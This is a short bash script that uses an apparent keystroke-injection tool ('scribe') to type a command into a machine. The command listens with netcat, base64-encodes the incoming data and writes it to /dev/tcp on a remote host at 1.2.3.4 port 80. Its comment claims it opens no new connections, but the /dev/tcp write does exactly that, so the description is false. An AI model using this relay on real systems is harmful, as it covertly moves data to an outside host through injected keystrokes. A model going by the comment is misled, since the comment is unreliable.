#!/bin/bash

# This script forwards network traffic, without initiating new connections

LPORT=12345

RHOST="1.2.3.4"
RPORT=80

echo "TYPE ’echo $(nc -lNp $LPORT | base64 -w 0) | base64 -d > /dev/tcp/$RHOST/$RPORT’ <enter>" | scribe
